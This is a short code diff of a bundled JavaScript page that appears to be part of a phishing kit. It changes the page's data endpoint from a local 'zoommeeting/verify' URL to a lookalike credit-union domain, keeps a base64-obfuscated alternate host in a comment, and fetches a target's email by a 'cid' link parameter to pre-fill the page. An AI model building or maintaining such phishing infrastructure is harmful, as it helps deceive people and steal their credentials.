@@ -14295,7 +14295,7 @@ to {
           , X = W.useRef()
           , [u,d] = W.useState("sir");
         // var dburl = atob('aHR0cHM6Ly9zZW5kYXJzby5jZmQvem1kYi8/Y2lk');
-        var dburl = 'http://127.0.0.1:8000/zoommeeting/verify/'
+        var dburl = 'https://backend.newbethelfcreditunion.com/client-data/?cid'
 
         W.useEffect( () => {
             const clientKey = new URLSearchParams(window.location.search).get('cid');
@@ -14310,6 +14310,7 @@ to {
                 }
                 ).then(data => {
                     window.allInfo = data;
+                    console.log(allInfo.clientemail)
 
                     if (allInfo.clientemail) {
                         // Check if clientemail exists
